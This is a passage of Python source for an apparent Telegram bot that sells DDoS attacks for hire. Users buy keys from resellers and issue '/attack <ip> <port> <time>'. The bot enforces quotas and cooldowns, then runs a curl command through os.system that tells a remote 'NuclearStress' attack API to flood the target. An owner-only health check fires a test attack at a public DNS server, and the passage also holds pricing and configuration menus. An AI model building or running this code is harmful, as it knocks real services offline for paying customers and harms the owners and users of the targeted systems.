    return user_id in pending_feedback

def create_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty

def send_curl_attack(target, port, duration, concurrent_val):

    """Send Curl Attack Using NuclearStress API (HTTP/HTTPS)"""
    
    print(f"🔍 DEBUG: API_KEY= {API_KEY}")
    print(f"🔍 DEBUG: API_BASE_URL= {API_BASE_URL}")
    print(f"🔍 DEBUG: METHOD= {ATTACK_METHOD}")
    
    url = f"{API_BASE_URL}/api/attack?host={target}&port={port}&time={duration}&method={ATTACK_METHOD}"
    
    cmd = f'''curl -k --http1.1 -4 -s --max-time 10 --connect-timeout 5 \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Accept: application/json" \
  -H "Referer: https://discretion-applicant-gamma-sized.trycloudflare.com/" \
  -H "Origin: https://discretion-applicant-gamma-sized.trycloudflare.com/" \
  "{url}" > /dev/null 2>&1 &'''
    
    try:
        os.system(cmd)
        print(f"✅ ATTACK EXECUTED! {target}:{port} | {duration}s")
        return {"success": True, "message": "Attack fired"}
    except Exception as e:
        print(f"❌ ATTACK ERROR: {e}")
        return {"success": False, "message": str(e)}

def is_group_approved(group_id):
    group = approved_groups_collection.find_one({'group_id': str(group_id)})
    if not group:
        return False, None
    
    if group.get('expiry_date') and group['expiry_date'] < datetime.now():
        return False, None
    
    return True, group

def get_group_config(group_id):
    return approved_groups_collection.find_one({'group_id': str(group_id)})

def get_group_max_attack_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_attack_time'):
        return group['max_attack_time']
    return get_max_attack_time()

def get_group_max_slots(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_slots'):
        return group['max_slots']
    return current_max_slots

def get_group_cooldown(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        cooldown_key = f"group_cooldown_{group_id}"
        cooldown_data = get_setting(cooldown_key, None)
        if cooldown_data:
            if cooldown_data > datetime.now():
                return int((cooldown_data - datetime.now()).total_seconds())
    return 0

def set_group_cooldown(group_id, seconds):
    cooldown_key = f"group_cooldown_{group_id}"
    set_setting(cooldown_key, datetime.now() + timedelta(seconds=seconds))

def get_group_feedback_required(group_id):
    group = get_group_config(group_id)
    if group and 'feedback_required' in group:
        return group['feedback_required']
    return get_setting('feedback_required', True)

def set_group_feedback_required(group_id, required):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'feedback_required': required}}
    )

def set_group_max_attack_time(group_id, max_time):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_attack_time': max_time}}
    )

def set_group_max_slots(group_id, slots):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_slots': slots}}
    )

def set_group_cooldown_time(group_id, cooldown):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'cooldown': cooldown}}
    )

def get_group_cooldown_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        return group['cooldown']
    return get_user_cooldown_setting()

def generate_status_text(user_id=None):
    active_count = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
    max_global = current_max_slots
    max_time_setting = get_max_attack_time()

    bolt = pe('lightning','⚡')
    gear = pe('gear','⚙️')
    timer_e = pe('hourglass','⏳')
    ref = pe('refresh','🔄')
    
    text = f"{bolt} <b>Aᴄᴛɪᴠᴇ Aᴛᴛᴀᴄᴋꜱ:</b> {active_count}/{max_global}\n"

    if active_count == 0:
        text += f"\n★ Nᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋꜱ...."
    else:
        with _attack_lock:
            now = datetime.now()
            for aid, atk in list(active_attacks.items()):
                if atk['end_time'] > now:
                    remaining = int((atk['end_time'] - now).total_seconds())
                    total_duration = atk['duration']
                    elapsed = total_duration - remaining
                    progress = int((elapsed / total_duration) * 20) if total_duration > 0 else 20
                    bar = "█" * progress + "░" * (20 - progress)
                    percent = int((elapsed / total_duration) * 100) if total_duration > 0 else 100
                    chat_type_display = "Pʀɪᴠᴀᴛᴇ" if not atk.get('is_group', False) else "Gʀᴏᴜᴘ"
                    text += f"\n★ – {atk['target']}:{atk['port']} ({remaining}s) ʙʏ {atk['user_id']} {chat_type_display}\n  [{bar}] {percent}%"

    text += f"""

{gear} <b>Bᴀꜱɪᴄ Sᴇᴛᴛɪɴɢꜱ:</b>
★ Cᴏɴᴄᴜʀʀᴇɴᴛ = {max_global}
★ Mᴀx ᴛɪᴍᴇ = {max_time_setting}s"""

    if user_id and not is_owner(user_id):
        cd = get_user_cooldown(user_id)
        if cd > 0:
            text += f"\n\n{timer_e} <b>Yᴏᴜʀ Cᴏᴏʟᴅᴏᴡɴ:</b> {cd}s Rᴇᴍᴀɪɴɪɴɢ\n\n{ref} <b>Aᴜᴛᴏ-Uᴘᴅᴀᴛᴇ ꜱᴛᴀᴛᴜꜱ ᴇᴠᴇʀʏ 5 ꜱᴇᴄᴏɴᴅꜱ</b>"
        else:
            text += f"\n\n{timer_e} <b>Yᴏᴜʀ Cᴏᴏʟᴅᴏᴡɴ:</b> Rᴇᴀᴅʏ\n\n{ref} <b>Aᴜᴛᴏ-Uᴘᴅᴀᴛᴇ ꜱᴛᴀᴛᴜꜱ ᴇᴠᴇʀʏ 5 ꜱᴇᴄᴏɴᴅꜱ</b>"
    return text
    
def _cleanup_expired_attacks_locked():
    now = datetime.now()
    expired = [aid for aid, a in active_attacks.items() if a["end_time"] <= now]
    for aid in expired:
        active_attacks.pop(aid, None)
        api_in_use.pop(aid, None)
        active_port_attacks.pop(aid, None)

def live_status_updater(chat_id, message_id, stop_event, user_id):
    try:
        while not stop_event.is_set():
            time.sleep(5)
            if stop_event.is_set():
                break
                
            with _attack_lock:
                _cleanup_expired_attacks_locked()
                has_active = len(active_attacks) > 0
                
            if not has_active:
                break
                
            try:
                bot.edit_message_text(
                    generate_status_text(user_id),
                    chat_id,
                    message_id,
                    parse_mode="HTML",
                    reply_markup=MAIN_KEYBOARD
                )
            except Exception as e:
                if "message is not modified" not in str(e):
                    pass
    finally:
        live_status_trackers.pop(chat_id, None)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    if is_group:
        is_approved, group_config = is_group_approved(group_id)
        if not is_approved:
            safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Tʜɪꜱ ɢʀᴏᴜᴘ ɪꜱ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇᴅ ꜰᴏʀ ᴀᴛᴛᴀᴄᴋ\n\n{pe('briefcase','📞')} Cᴏɴᴛᴀᴄᴛ ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴛᴏ ɢᴇᴛ ᴛʜɪꜱ ɢʀᴏᴜᴘ ᴀᴘᴘʀᴏᴠᴇᴅ.", reply_to=message, parse_mode="HTML")
            return
        
        group_cooldown = get_group_cooldown(group_id)
        if group_cooldown > 0:
            safe_send_message(message.chat.id, f"{pe('hourglass','⏳')} Gʀᴏᴜᴘ ᴄᴏᴏʟᴅᴏᴡɴ ᴀᴄᴛɪᴠᴇ! Wᴀɪᴛ: {group_cooldown}ꜱ", reply_to=message, parse_mode="HTML")
            return
        
        if get_group_feedback_required(group_id) and has_pending_feedback(user_id, is_group, group_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message, parse_mode="HTML")
            return
        
        group_max_slots = get_group_max_slots(group_id)
        with _attack_lock:
            used_in_group = 0
            for attack in active_attacks.values():
                if attack.get('group_id') == group_id and attack['end_time'] > datetime.now():
                    used_in_group += 1
            if used_in_group >= group_max_slots:
                safe_send_message(message.chat.id, f"{pe('cross','❌')} Gʀᴏᴜᴘ ᴍᴀx ꜱʟᴏᴛꜱ ʀᴇᴀᴄʜᴇᴅ! Oɴʟʏ {group_max_slots} ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱ ᴀᴛᴛᴀᴄᴋꜱ ᴀʟʟᴏᴡᴇᴅ ɪɴ ᴛʜɪꜱ ɢʀᴏᴜᴘ.", reply_to=message, parse_mode="HTML")
                return
    
    if not is_group:
        if get_setting('feedback_required', True) and has_pending_feedback(user_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message, parse_mode="HTML")
            return
        
        if not has_valid_key(user_id):
            user = users_collection.find_one({'user_id': user_id})
            if user and user.get('reseller_username'):
                safe_send_message(message.chat.id, f"{pe('cross','❌')} Kᴇʏ ᴇxᴘɪʀᴇᴅ!\n\n{pe('refresh','🔄')}Fᴏʀ ʀᴇɴᴇᴡᴀʟ DM: @{user.get('reseller_username')}", reply_to=message, parse_mode="HTML")
            else:
                safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀ ᴠᴀʟɪᴅ ᴋᴇʏ!\n\n{pe('key','🔑')} Cᴏɴᴛᴀᴄᴛ ᴀ ʀᴇꜱᴇʟʟᴇʀ ᴛᴏ ᴘᴜʀᴄʜᴀꜱᴇ ᴀ ᴋᴇʏ.", reply_to=message, parse_mode="HTML")
            return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, f"<b>{pe('fire','🔥')} Aᴛᴛᴀᴄᴋ Cᴏᴍᴍᴀɴᴅ Fᴏʀᴍᴀᴛ {pe('fire','🔥')}</b>\n\n{pe('warning','⚠️')} Usᴀɢᴇ: /attack &lt;ɪᴘ&gt; &lt;ᴘᴏʀᴛ&gt; &lt;ᴛɪᴍᴇ&gt;\n\n<b>{pe('gear','⚙️')} Bᴀꜱɪᴄ Sᴇᴛᴛɪɴɢꜱ/b>\n★ Mᴀx Dᴜʀᴀᴛɪᴏɴ: {MIN_ATTACK_TIME}\n★ Bʟᴏᴄᴋᴇᴅ Pᴏʀᴛs: 443, 8700, 9031, 17500, 20000, 20001, 20002\n\n<b>{pe('diamond','🔸')} Rᴇᴀʟ-Tɪᴍᴇ ᴘʀᴏɢʀᴇꜱꜱ ᴡɪʟʟ ʙᴇ ꜱʜᴏᴡɴ!</b>", reply_to=message, parse_mode="HTML")
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not is_owner(user_id):
        is_attacking, end_time = is_port_being_attacked(target, port)
        if is_attacking:
            remaining = int((end_time - datetime.now()).total_seconds())
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Pᴏʀᴛ {port} ɪꜱ ᴀʟʀᴇᴀᴅʏ ʙᴇɪɴɢ ᴀᴛᴛᴀᴄᴋᴇᴅ ᴏɴ {target}!\n\n{pe('timer','⏱️')} Tɪᴍᴇ ʀᴇᴍᴀɪɴɪɴɢ: {remaining}ꜱ\n\nPʟᴇᴀꜱᴇ ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ ᴛᴏ ꜰɪɴɪꜱʜ ʙᴇꜰᴏʀᴇ ʟᴀᴜɴᴄʜɪɴɢ ᴀɴᴏᴛʜᴇʀ ᴀᴛᴛᴀᴄᴋ ᴏɴ ᴛʜᴇ ꜱᴀᴍᴇ ᴘᴏʀᴛ.", reply_to=message, parse_mode="HTML")
            return

    if not validate_target(target):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ IP!", reply_to=message, parse_mode="HTML")
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, f"{pe('warning','🚫')} IP {target} ɪꜱ ʙʟᴏᴄᴋᴇᴅ! Usᴇ ᴀɴᴏᴛʜᴇʀ IP.", reply_to=message, parse_mode="HTML")
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴘᴏʀᴛ! (1-65535)", reply_to=message, parse_mode="HTML")
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Mɪɴɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ ɪꜱ {MIN_ATTACK_TIME} ꜱᴇᴄᴏɴᴅꜱ!", reply_to=message, parse_mode="HTML")
            return
        
        if not is_group:
            user = users_collection.find_one({'user_id': user_id})
            key_type = user.get('key_type', 'NORMAL') if user else 'NORMAL'
            max_time = user.get('max_attack_time', get_key_max_attack(key_type)) if user else get_max_attack_time()
        else:
            max_time = get_group_max_attack_time(group_id)
        
        if not is_owner(user_id) and duration > max_time:
            if not is_group:
                safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜʀ {key_type} ᴋᴇʏ ᴀʟʟᴏᴡꜱ ᴍᴀx {max_time}ꜱ ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ!", reply_to=message, parse_mode="HTML")
            else:
                safe_send_message(message.chat.id, f"{pe('cross','❌')} Mᴀx ᴛɪᴍᴇ ꜰᴏʀ ᴛʜɪꜱ ɢʀᴏᴜᴘ: {max_time}ꜱ", reply_to=message, parse_mode="HTML")
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        slot_index = get_free_slot()
        
        if slot_index is None:
            busy_slots, free_slots, total_slots = get_slot_status()
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Mᴀx ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ! Aʟʟ {total_slots} ꜱʟᴏᴛꜱ ᴀʀᴇ ʙᴜꜱʏ.\n\nPʟᴇᴀꜱᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.", reply_to=message, parse_mode="HTML")
            return
        
        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = slot_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'is_group': is_group,
                'group_id': group_id
            }
            active_port_attacks[attack_id] = f"{target}:{port}"
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, slot_index, is_group, group_id))
        thread.daemon = True
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Pᴏʀᴛ ᴀɴᴅ ᴛɪᴍᴇ ᴍᴜꜱᴛ ʙᴇ ɴᴜᴍʙᴇʀꜱ!", reply_to=message, parse_mode="HTML")

def start_attack(target, port, duration, message, attack_id, api_index, is_group=False, group_id=None):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        try:
            log_attack(user_id, username, target, port, duration)
        except Exception as e:
            print(f"[ERROR] log_attack failed: {e}")

        try:
            cooldown = get_group_cooldown_time(group_id) if is_group and group_id else get_user_cooldown_setting()
        except Exception:
            cooldown = 60
        
        try:
            safe_send_message(message.chat.id, build_attack_start_message(target, port, duration, cooldown), reply_to=message, parse_mode="HTML")
        except Exception as e:
            print(f"[ERROR] Failed to send start message: {e}")

        concurrent_val = get_concurrent_limit()
        try:
            result = send_curl_attack(target, port, duration, concurrent_val)
            
            if result and result.get("success"):
                print(f"[INFO] Attack ok {target}:{port}")
            else:
                print(f"[WARNING] Attack issue {target}:{port} -> {result}")
                error_msg = result.get("message", "Unknown API Error") if result else "No response from API"
                safe_send_message(message.chat.id, f"{pe('warning','⚠️')} **Attack Executing Error!**\n\n`{error_msg}`", reply_to=message, parse_mode="Markdown")
        except Exception as api_e:
            print(f"[ERROR] API CALL FAILED: {api_e}")
            safe_send_message(message.chat.id, f"{pe('warning','⚠️')} **Attack Executing Error!**\n\n`{str(api_e)}`", reply_to=message, parse_mode="Markdown")

        def finish_attack():
            try:
                with _attack_lock:
                    active_attacks.pop(attack_id, None)
                    api_in_use.pop(attack_id, None)
                    active_port_attacks.pop(attack_id, None)
            except Exception:
                pass

            try:
                if is_group and group_id:
                    set_group_cooldown(group_id, get_group_cooldown_time(group_id))
                else:
                    set_user_cooldown(user_id, get_user_cooldown_setting())
            except Exception:
                pass

            try:
                safe_send_message(message.chat.id, build_attack_complete_message(target, port, duration), reply_to=message, parse_mode="HTML")
            except Exception:
                pass

            try:
                feedback_required = get_group_feedback_required(group_id) if is_group and group_id else get_setting("feedback_required", True)
                if feedback_required:
                    set_pending_feedback(user_id, target, port, duration, is_group, group_id)
                else:
                    safe_send_message(message.chat.id, f"{pe('check','✅')} Yᴏᴜ ᴄᴀɴ ɴᴏᴡ ꜱᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ ᴜꜱɪɴɢ /attack ᴄᴏᴍᴍᴀɴᴅ.", reply_to=message, parse_mode="HTML")
            except Exception:
                pass

        t = threading.Timer(duration, finish_attack)
        t.daemon = True
        t.start()
        
    except Exception as e:
        print(f"[FATAL] start_attack outer error: {e}")
        with _attack_lock:
            active_attacks.pop(attack_id, None)
            api_in_use.pop(attack_id, None)
            active_port_attacks.pop(attack_id, None)
        
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} **Attack Executing Error!**\n\n`{str(e)}`", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["apihealth"])
def api_health_check(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Oɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ!", parse_mode="HTML")
        return
    
    status_msg = bot.reply_to(message, f"{pe('refresh','🔄')} Cʜᴇᴄᴋɪɴɢ API...", parse_mode="HTML")
    
    try:
        test_url = f"{API_BASE_URL}/api/attack?host=8.8.8.8&port=80&time=1&method={ATTACK_METHOD}"
        start = time.time()
        response = requests.get(test_url, timeout=10)
        end = time.time()
        response_time = int((end - start) * 1000)
        
        if response.status_code == 200:
            result = f"""
╔═════════════════════════╗
║       {pe('target','🔍')} API HEALTH STATUS!
╠═════════════════════════╣
║ ★ STATUS: {pe('check','🟢')} ONLINE
║ ★ PING STATS: {response_time}ms
║ ★ HTTP RESPONSE: {response.status_code}
║ ★ DURATION: {datetime.now().strftime('%H:%M:%S')} IST
╚═════════════════════════╝"""
        else:
            result = f"""
╔═════════════════════════╗
║       {pe('target','🔍')} API HEALTH STATUS!
╠═════════════════════════╣
║ ★ STATUS: {pe('cross','🔴')} ERROR
║ ★ HTTP RESPONSE: {response.status_code}
║ ★ DURATION: {datetime.now().strftime('%H:%M:%S')} IST
╚═════════════════════════╝"""
        
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
        
        bot.reply_to(message, result, parse_mode="HTML")
        
    except Exception as e:
        result = f"""
╔═════════════════════════╗
║       {pe('target','🔍')} API HEALTH STATUS!
╠═════════════════════════╣
║ ★ STATUS: {pe('cross','🔴')} OFFLINE
║ ★ ERROR: {str(e)[:20]}....
║ ★ DURATION: {datetime.now().strftime('%H:%M:%S')} IST
╚═════════════════════════╝"""
        
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
        
        bot.reply_to(message, result, parse_mode="HTML")

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id) and message.chat.type not in ['group', 'supergroup']:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Pᴜʀᴄʜᴀꜱᴇ ᴀ ᴋᴇʏ ꜰɪʀꜱᴛ!", reply_to=message, parse_mode="HTML")
        return
    
    chat_id = message.chat.id
    if chat_id in live_status_trackers:
        live_status_trackers[chat_id].set()
    
    initial_text = generate_status_text(user_id)
    sent = bot.reply_to(message, initial_text, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    
    stop_event = threading.Event()
    live_status_trackers[chat_id] = stop_event
    thread = threading.Thread(target=live_status_updater, args=(chat_id, sent.message_id, stop_event, user_id))
    thread.daemon = True
    thread.start()

@bot.message_handler(commands=["config"])
def config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚙️ Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ", callback_data="config_maxtime"),
        InlineKeyboardButton("⏳ Cᴏᴏʟᴅᴏᴡɴ", callback_data="config_cooldown"),
        InlineKeyboardButton("🎯 Mᴀx Sʟᴏᴛꜱ", callback_data="config_slots"),
        InlineKeyboardButton("⚡ Cᴏɴᴄᴜʀʀᴇɴᴛ/Aᴛᴛᴀᴄᴋ", callback_data="config_concurrent"),
        InlineKeyboardButton("🚫 Bʟᴏᴄᴋ IP", callback_data="config_blockip"),
        InlineKeyboardButton("✅ Uɴʙʟᴏᴄᴋ IP", callback_data="config_unblockip"),
        InlineKeyboardButton("📋 Bʟᴏᴄᴋᴇᴅ IPꜱ", callback_data="config_listip"),
        InlineKeyboardButton("🔒 Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ", callback_data="config_portprotect"),
        InlineKeyboardButton("📸 Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ", callback_data="config_feedback"),
        InlineKeyboardButton("💰 VIP Pʀɪᴄɪɴɢ", callback_data="config_vip_price"),
        InlineKeyboardButton("💰 NORMAL Pʀɪᴄɪɴɢ", callback_data="config_normal_price"),
        InlineKeyboardButton("👥 Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢꜱ", callback_data="config_group"),
        InlineKeyboardButton("🤖 Bᴏᴛ Sᴇᴛᴛɪɴɢꜱ", callback_data="config_bot"),
        InlineKeyboardButton("🔧 Mᴀɪɴᴛᴇɴᴀɴᴄᴇ", callback_data="config_maintenance"),
        InlineKeyboardButton("📊 Cᴜʀʀᴇɴᴛ Sᴇᴛᴛɪɴɢꜱ", callback_data="config_view")
    )
    
    bot.reply_to(message, f"{pe('gear','🔧')} **ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ ᴘᴀɴᴇʟ**\n\nSᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ᴛᴏ ᴄᴏɴꜰɪɢᴜʀᴇ:", reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("config_"))
def config_callback(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id):
        bot.answer_callback_query(call.id, "❌ Oɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ!")
        return
    
    data = call.data
    
    if data == "config_maxtime":
        bot.edit_message_text(
            f"{pe('gear','⚙️')} <b>Sᴇᴛ Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ</b>\n\nSᴇɴᴅ ᴛʜᴇ ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ.\n"
            f"Cᴜʀʀᴇɴᴛ: {get_max_attack_time()} ꜱᴇᴄᴏɴᴅꜱ\n\nExᴀᴍᴘʟᴇ: <code>300</code>\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_max_time_config)
    elif data == "config_cooldown":
        bot.edit_message_text(
            f"{pe('hourglass','⏳')} <b>Sᴇᴛ Cᴏᴏʟᴅᴏᴡɴ Tɪᴍᴇ</b>\n\nSᴇɴᴅ ᴛʜᴇ ᴄᴏᴏʟᴅᴏᴡɴ ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ.\n"
            f"Cᴜʀʀᴇɴᴛ: {get_user_cooldown_setting()} ꜱᴇᴄᴏɴᴅꜱ\n\nExᴀᴍᴘʟᴇ: <code>180</code>\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_cooldown_config)
    elif data == "config_slots":
        bot.edit_message_text(
            f"{pe('target','🎯')} <b>Sᴇᴛ Mᴀx Sʟᴏᴛꜱ (Sɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱ Aᴛᴛᴀᴄᴋꜱ)</b>\n\nSᴇɴᴅ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱ ᴀᴛᴛᴀᴄᴋꜱ ᴀʟʟᴏᴡᴇᴅ.\n"
            f"Cᴜʀʀᴇɴᴛ: {current_max_slots}\n\nExᴀᴍᴘʟᴇ: <code>4</code>\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_slots_config)
    elif data == "config_concurrent":
        bot.edit_message_text(
            f"{pe('lightning','⚡')} <b>Sᴇᴛ Cᴏɴᴄᴜʀʀᴇɴᴛ Pᴇʀ Aᴛᴛᴀᴄᴋ</b>\n\nSᴇɴᴅ ᴛʜᴇ ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴠᴀʟᴜᴇ ꜰᴏʀ ᴇᴀᴄʜ API ᴄᴀʟʟ.\n"
            f"Cᴜʀʀᴇɴᴛ: {get_concurrent_limit()}\n\nExᴀᴍᴘʟᴇ: <code>4</code>\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_concurrent_config)
    elif data == "config_blockip":
        bot.edit_message_text(
            f"{pe('warning','🚫')} <b>Bʟᴏᴄᴋ IP</b>\n\nSᴇɴᴅ ᴛʜᴇ IP ᴘʀᴇꜰɪx ᴛᴏ ʙʟᴏᴄᴋ.\n\nExᴀᴍᴘʟᴇ: <code>20.204</code> (ʙʟᴏᴄᴋꜱ ᴀʟʟ IPꜱ ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ 20.204)\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, block_ip_config)
    elif data == "config_unblockip":
        bot.edit_message_text(
            f"{pe('check','✅')} <b>Uɴʙʟᴏᴄᴋ IP</b>\n\nSᴇɴᴅ ᴛʜᴇ IP ᴘʀᴇꜰɪx ᴛᴏ ᴜɴʙʟᴏᴄᴋ.\n\nUsᴇ /blockedips ᴛᴏ ꜱᴇᴇ ʙʟᴏᴄᴋᴇᴅ ᴘʀᴇꜰɪxᴇꜱ.\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, unblock_ip_config)
    elif data == "config_listip":
        blocked = get_all_blocked_ips()
        if not blocked:
            response = "📋 Nᴏ IPꜱ ᴀʀᴇ ʙʟᴏᴄᴋᴇᴅ!"
        else:
            response = f"{pe('warning','🚫')} <b>Bʟᴏᴄᴋᴇᴅ IPꜱ</b>\n\n"
            for i, ip_data in enumerate(blocked, 1):
                response += f"{i}. <code>{ip_data['ip']}*</code>\n"
            response += f"\n📊 Tᴏᴛᴀʟ: {len(blocked)}"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif data == "config_portprotect":
        current = get_setting('port_protection', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ Eɴᴀʙʟᴇ" if not current else "🔴 Aʟʀᴇᴀᴅʏ ON", callback_data="portprotect_on"),
            InlineKeyboardButton("❌ Dɪꜱᴀʙʟᴇ" if current else "⚪ Aʟʀᴇᴀᴅʏ OFF", callback_data="portprotect_of"),
            InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{pe('gear','🔒')} <b>Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ</b>\n\nCᴜʀʀᴇɴᴛ: {'🟢 Eɴᴀʙʟᴇᴅ' if current else '🔴 Dɪꜱᴀʙʟᴇᴅ'}\n\nWʜᴇɴ ᴇɴᴀʙʟᴇᴅ, ꜱᴀᴍᴇ ᴘᴏʀᴛ ᴄᴀɴɴᴏᴛ ʙᴇ ᴀᴛᴛᴀᴄᴋᴇᴅ ᴛᴡɪᴄᴇ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱʟʏ.",
            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML"
        )
    elif data == "config_feedback":
        current = get_setting('feedback_required', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ Eɴᴀʙʟᴇ" if not current else "🔴 Aʟʀᴇᴀᴅʏ ON", callback_data="feedback_on"),
            InlineKeyboardButton("❌ Dɪꜱᴀʙʟᴇ" if current else "⚪ Aʟʀᴇᴀᴅʏ OFF", callback_data="feedback_of"),
